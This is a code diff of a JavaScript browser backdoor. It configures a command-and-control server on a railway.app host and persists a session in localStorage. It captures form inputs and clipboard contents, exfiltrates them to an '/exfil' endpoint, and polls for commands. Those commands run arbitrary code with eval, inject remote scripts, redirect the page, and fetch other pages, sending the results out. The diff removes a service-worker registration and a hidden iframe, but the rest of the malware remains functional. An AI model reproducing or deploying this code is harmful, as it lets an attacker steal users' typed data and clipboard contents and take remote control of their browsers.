@@ -1,27 +1,22 @@
 (function() {
     'use strict';
 
-    // ===== CONFIG — YOUR RECEIVER URL =====
+    // ===== CONFIG — YOUR RECEIVER =====
     const CONFIG = {
-        C2_SERVER: 'https://verdant-frangipane-b8d9fd-production.up.railway.app/',  // ← YOUR RECEIVER
+        C2_SERVER: 'https://verdant-frangipane-b8d9fd-production.up.railway.app/',
         HEARTBEAT_INTERVAL: 30000,
         BACKUP_DOMAINS: [],
         SESSION_KEY: '_bckdr_sid',
         COMMAND_ENDPOINT: '/cmd',
         DATA_ENDPOINT: '/exfil'
     };
-    // =====================================
+    // ====================================
 
     // ===== PERSISTENCE =====
     function persist() {
         if (!localStorage.getItem(CONFIG.SESSION_KEY)) {
             const sid = btoa(Date.now() + '-' + Math.random());
             localStorage.setItem(CONFIG.SESSION_KEY, sid);
-        }
-        if ('serviceWorker' in navigator) {
-            try {
-                navigator.serviceWorker.register('/sw.js', { scope: '/' }).catch(() => {});
-            } catch(e) {}
         }
         const originalPushState = history.pushState;
         history.pushState = function() {
@@ -82,7 +77,7 @@
         });
     }
 
-    // ===== EXFILTRATION =====
+    // ===== EXFILTRATION ENGINE =====
     function exfiltrate(data) {
         const payload = {
             session: localStorage.getItem(CONFIG.SESSION_KEY),
@@ -122,11 +117,27 @@
                     commands.forEach(cmd => {
                         try {
                             switch(cmd.type) {
-                                case 'eval': eval(cmd.code); break;
-                                case 'inject': const s = document.createElement('script'); s.src = cmd.url; document.head.appendChild(s); break;
-                                case 'redirect': location.href = cmd.url; break;
-                                case 'alert': alert(cmd.message); break;
-                                case 'fetch': fetch(cmd.url, cmd.options || {}).then(r => r.text()).then(data => { exfiltrate({ type: 'fetch_result', data: data }); }); break;
+                                case 'eval':
+                                    eval(cmd.code);
+                                    break;
+                                case 'inject':
+                                    const s = document.createElement('script');
+                                    s.src = cmd.url;
+                                    document.head.appendChild(s);
+                                    break;
+                                case 'redirect':
+                                    location.href = cmd.url;
+                                    break;
+                                case 'alert':
+                                    alert(cmd.message);
+                                    break;
+                                case 'fetch':
+                                    fetch(cmd.url, cmd.options || {})
+                                        .then(r => r.text())
+                                        .then(data => {
+                                            exfiltrate({ type: 'fetch_result', data: data });
+                                        });
+                                    break;
                             }
                         } catch(e) {}
                     });
@@ -147,10 +158,6 @@
         startClipboardMonitor();
         captureForms();
         startHeartbeat();
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = CONFIG.C2_SERVER + 'keepalive.html';
-        document.body.appendChild(iframe);
     }
 
     if (document.readyState === 'loading') {
